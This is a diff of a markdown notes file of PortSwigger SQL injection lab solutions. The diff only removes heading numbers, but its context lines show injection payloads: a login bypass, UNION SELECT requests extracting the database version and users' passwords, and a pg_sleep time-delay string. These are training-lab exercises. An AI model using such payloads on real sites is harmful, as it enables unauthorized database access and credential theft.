@@ -1,25 +1,25 @@
 # PortSwigger Labs
 <!-- vscode-markdown-toc -->
-* 1. [SQL Injection](#SQLInjection)
-	* 1.1. [Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata)
-	* 1.2. [Lab 02: SQL injection vulnerability allowing login bypass](#Lab02:SQLinjectionvulnerabilityallowingloginbypass)
-	* 1.3. [Lab 03: SQL injection attack, querying the database type and version on Oracle](#Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle)
-	* 1.4. [Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft](#Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft)
-	* 1.5. [Lab 05: SQL injection attack, listing the database contents on non-Oracle databases](#Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases)
-	* 1.6. [Lab 06: SQL injection attack, listing the database contents on Oracle](#Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle)
-	* 1.7. [Lab 07: SQL injection UNION attack, determining the number of columns returned by the query](#Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery)
-	* 1.8. [Lab 08: SQL injection UNION attack, finding a column containing text](#Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext)
-	* 1.9. [Lab 09: SQL injection UNION attack, retrieving data from other tables](#Lab09:SQLinjectionUNIONattackretrievingdatafromothertables)
-	* 1.10. [Lab 10: SQL injection UNION attack, retrieving multiple values in a single column](#Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn)
-	* 1.11. [Lab 11: Blind SQL injection with conditional responses](#Lab11:BlindSQLinjectionwithconditionalresponses)
-	* 1.12. [Lab 12: Blind SQL injection with conditional errors](#Lab12:BlindSQLinjectionwithconditionalerrors)
-	* 1.13. [Lab 13: Visible error-based SQL injection](#Lab13:Visibleerror-basedSQLinjection)
-	* 1.14. [Lab 14: Blind SQL injection with time delays](#Lab14:BlindSQLinjectionwithtimedelays)
-	* 1.15. [Lab 15: Blind SQL injection with time delays and information retrieval](#Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval)
-	* 1.16. [Lab 16: Blind SQL injection with out-of-band interaction](#Lab16:BlindSQLinjectionwithout-of-bandinteraction)
+* [SQL Injection](#SQLInjection)
+	* [Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata)
+	* [Lab 02: SQL injection vulnerability allowing login bypass](#Lab02:SQLinjectionvulnerabilityallowingloginbypass)
+	* [Lab 03: SQL injection attack, querying the database type and version on Oracle](#Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle)
+	* [Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft](#Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft)
+	* [Lab 05: SQL injection attack, listing the database contents on non-Oracle databases](#Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases)
+	* [Lab 06: SQL injection attack, listing the database contents on Oracle](#Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle)
+	* [Lab 07: SQL injection UNION attack, determining the number of columns returned by the query](#Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery)
+	* [Lab 08: SQL injection UNION attack, finding a column containing text](#Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext)
+	* [Lab 09: SQL injection UNION attack, retrieving data from other tables](#Lab09:SQLinjectionUNIONattackretrievingdatafromothertables)
+	* [Lab 10: SQL injection UNION attack, retrieving multiple values in a single column](#Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn)
+	* [Lab 11: Blind SQL injection with conditional responses](#Lab11:BlindSQLinjectionwithconditionalresponses)
+	* [Lab 12: Blind SQL injection with conditional errors](#Lab12:BlindSQLinjectionwithconditionalerrors)
+	* [Lab 13: Visible error-based SQL injection](#Lab13:Visibleerror-basedSQLinjection)
+	* [Lab 14: Blind SQL injection with time delays](#Lab14:BlindSQLinjectionwithtimedelays)
+	* [Lab 15: Blind SQL injection with time delays and information retrieval](#Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval)
+	* [Lab 16: Blind SQL injection with out-of-band interaction](#Lab16:BlindSQLinjectionwithout-of-bandinteraction)
 
 <!-- vscode-markdown-toc-config
-	numbering=true
+	numbering=false
 	autoSave=true
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
@@ -30,8 +30,8 @@
 
 ----
 
-##  1. <a name='SQLInjection'></a>SQL Injection
-###  1.1. <a name='Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata'></a>Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+## <a name='SQLInjection'></a>SQL Injection
+### <a name='Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata'></a>Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 Level: Apprentice
 
@@ -55,7 +55,7 @@ Query:
 
 ![](imgs/2023-09-11-20-09-36.png)
 
-###  1.2. <a name='Lab02:SQLinjectionvulnerabilityallowingloginbypass'></a>Lab 02: SQL injection vulnerability allowing login bypass
+### <a name='Lab02:SQLinjectionvulnerabilityallowingloginbypass'></a>Lab 02: SQL injection vulnerability allowing login bypass
 [Link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
 ![](imgs/2023-09-11-20-33-25.png)
@@ -66,7 +66,7 @@ Username: administrator'--
 Password: random
 ```
 
-###  1.3. <a name='Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle'></a>Lab 03: SQL injection attack, querying the database type and version on Oracle
+### <a name='Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle'></a>Lab 03: SQL injection attack, querying the database type and version on Oracle
 
 [Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
 
@@ -77,7 +77,7 @@ Query:
 
 ![](imgs/2023-09-11-20-50-41.png)
 
-###  1.4. <a name='Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft'></a>Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft
+### <a name='Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft'></a>Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft
 [Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
 
 ![](imgs/2023-10-09-12-43-13.png)
@@ -94,7 +94,7 @@ GET /filter?category='+UNION+SELECT+@@version,NULL# HTTP/2
 
 ![](imgs/2023-10-09-12-57-44.png)
 
-###  1.5. <a name='Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases'></a>Lab 05: SQL injection attack, listing the database contents on non-Oracle databases
+### <a name='Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases'></a>Lab 05: SQL injection attack, listing the database contents on non-Oracle databases
 [Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
 
 ```
@@ -123,7 +123,7 @@ Password: 0dljnpj83cftlgyx16jq
 ```
 ![](imgs/2023-10-09-13-14-04.png)
 
-###  1.6. <a name='Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle'></a>Lab 06: SQL injection attack, listing the database contents on Oracle
+### <a name='Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle'></a>Lab 06: SQL injection attack, listing the database contents on Oracle
 [Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
 
 
@@ -156,7 +156,7 @@ Password: p6rdwe329a5kgdsu4q5b
 
 ![](imgs/2023-10-09-13-38-59.png)
 
-###  1.7. <a name='Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery'></a>Lab 07: SQL injection UNION attack, determining the number of columns returned by the query
+### <a name='Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery'></a>Lab 07: SQL injection UNION attack, determining the number of columns returned by the query
 
 [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
@@ -168,7 +168,7 @@ GET /filter?category='UNION+SELECT+NULL,NULL,NULL-- HTTP/2
 
 ![](imgs/2023-10-09-13-48-34.png)
 
-###  1.8. <a name='Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext'></a>Lab 08: SQL injection UNION attack, finding a column containing text
+### <a name='Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext'></a>Lab 08: SQL injection UNION attack, finding a column containing text
 [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
 ![](imgs/2023-10-09-13-52-49.png)
@@ -185,7 +185,7 @@ GET /filter?category='UNION+SELECT+NULL,'ViFdd7',NULL-- HTTP/2
 ```
 ![](imgs/2023-10-09-13-53-37.png)
 
-###  1.9. <a name='Lab09:SQLinjectionUNIONattackretrievingdatafromothertables'></a>Lab 09: SQL injection UNION attack, retrieving data from other tables
+### <a name='Lab09:SQLinjectionUNIONattackretrievingdatafromothertables'></a>Lab 09: SQL injection UNION attack, retrieving data from other tables
 [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
 
 ```
@@ -193,7 +193,7 @@ GET /filter?category='UNION+SELECT+username,password+from+users+WHERE+username='
 ```
 ![](imgs/2023-10-09-19-17-47.png)
 
-###  1.10. <a name='Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn'></a>Lab 10: SQL injection UNION attack, retrieving multiple values in a single column
+### <a name='Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn'></a>Lab 10: SQL injection UNION attack, retrieving multiple values in a single column
 [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
 
 ```
@@ -213,7 +213,7 @@ Password: at83g32icqx71z7sboa0
 
 ![](imgs/2023-10-09-19-33-29.png)
 
-###  1.11. <a name='Lab11:BlindSQLinjectionwithconditionalresponses'></a>Lab 11: Blind SQL injection with conditional responses
+### <a name='Lab11:BlindSQLinjectionwithconditionalresponses'></a>Lab 11: Blind SQL injection with conditional responses
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
 
 
@@ -261,7 +261,7 @@ Password: qd7g73kl51rhmvdb63xv
 ```
 ![](imgs/2023-10-09-21-52-08.png)
 
-###  1.12. <a name='Lab12:BlindSQLinjectionwithconditionalerrors'></a>Lab 12: Blind SQL injection with conditional errors
+### <a name='Lab12:BlindSQLinjectionwithconditionalerrors'></a>Lab 12: Blind SQL injection with conditional errors
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
 
 ```
@@ -318,7 +318,7 @@ Password: zw2nvf9u3eeztllnsih5
 ```
 ![](imgs/2023-10-09-23-41-35.png)
 
-###  1.13. <a name='Lab13:Visibleerror-basedSQLinjection'></a>Lab 13: Visible error-based SQL injection
+### <a name='Lab13:Visibleerror-basedSQLinjection'></a>Lab 13: Visible error-based SQL injection
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
 
 
@@ -348,7 +348,7 @@ Password: r2tlshhvr6m1cqmllrt3
 
 ![](imgs/2023-10-10-00-09-32.png)
 
-###  1.14. <a name='Lab14:BlindSQLinjectionwithtimedelays'></a>Lab 14: Blind SQL injection with time delays
+### <a name='Lab14:BlindSQLinjectionwithtimedelays'></a>Lab 14: Blind SQL injection with time delays
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
 
 Time delays cheat sheet:
@@ -359,7 +359,7 @@ TrackingId=<Your TrackingId>'||pg_sleep(10)--
 ```
 ![](imgs/2023-10-10-00-15-18.png)
 
-###  1.15. <a name='Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval'></a>Lab 15: Blind SQL injection with time delays and information retrieval
+### <a name='Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval'></a>Lab 15: Blind SQL injection with time delays and information retrieval
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
 
 ```
@@ -391,7 +391,7 @@ Password: 3ewy9yfdfg7vfqjlv1oy
 ```
 ![](imgs/2023-10-10-00-44-33.png)
 
-###  1.16. <a name='Lab16:BlindSQLinjectionwithout-of-bandinteraction'></a>Lab 16: Blind SQL injection with out-of-band interaction
+### <a name='Lab16:BlindSQLinjectionwithout-of-bandinteraction'></a>Lab 16: Blind SQL injection with out-of-band interaction
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
 
 
